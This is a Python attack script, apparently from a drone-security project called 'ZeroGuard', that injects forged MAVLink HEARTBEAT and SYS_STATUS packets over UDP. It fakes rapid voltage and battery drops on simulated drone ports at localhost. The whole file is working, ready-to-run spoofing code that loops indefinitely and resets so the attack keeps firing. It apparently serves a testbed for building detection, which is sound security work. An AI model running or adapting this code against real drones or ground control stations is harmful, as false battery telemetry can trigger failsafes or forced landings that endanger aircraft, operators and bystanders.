"""
ZeroGuard Attack Script — Battery Spoofing
Injects fake SYS_STATUS packets with rapid voltage/battery drops.
Usage: python3 attack_battery_spoof.py [drone_id]
"""
import sys, time, socket
from pymavlink import mavutil

DRONE_PORTS = {1: 14550, 2: 14560, 3: 14570}
TARGET_IP   = "127.0.0.1"

def make_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def send_udp(data, ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(data, (ip, port))
    s.close()

def run(drone_id=1):
    port = DRONE_PORTS.get(drone_id)
    if not port:
        print(f"[!] Invalid drone_id. Use 1, 2, or 3.")
        sys.exit(1)

    print(f"[!] BATTERY SPOOFING ATTACK — Drone {drone_id} (port {port})")
    print(f"[!] Injecting fake rapid voltage/battery drops")
    print(f"[!] Ctrl+C to stop\n")

    voltage_mv = 12500   # start at 12.5V (in millivolts)
    batt_pct   = 100

    count = 0
    while True:
        mav = make_mav()

        # Drop voltage aggressively
        voltage_mv = max(5000, voltage_mv - 300)   # -0.3V per burst
        batt_pct   = max(0,    batt_pct   - 12)    # -12% per burst

        hb = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        ).pack(mav)

        sys_status = mav.sys_status_encode(
            onboard_control_sensors_present=0,
            onboard_control_sensors_enabled=0,
            onboard_control_sensors_health=0,
            load=500,
            voltage_battery=voltage_mv,
            current_battery=2800,
            battery_remaining=batt_pct,
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=0, errors_count2=0,
            errors_count3=0, errors_count4=0
        ).pack(mav)

        send_udp(hb,         TARGET_IP, port)
        send_udp(sys_status, TARGET_IP, port)

        count += 1
        print(f"\r[+] Burst {count} | Fake voltage: {voltage_mv/1000:.2f}V | "
              f"Batt: {batt_pct}%", end="", flush=True)

        # Reset periodically so attack keeps firing
        if voltage_mv <= 5000 or batt_pct <= 0:
            voltage_mv = 12500
            batt_pct   = 100

        time.sleep(0.3)

if __name__ == "__main__":
    did = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    try:
        run(did)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")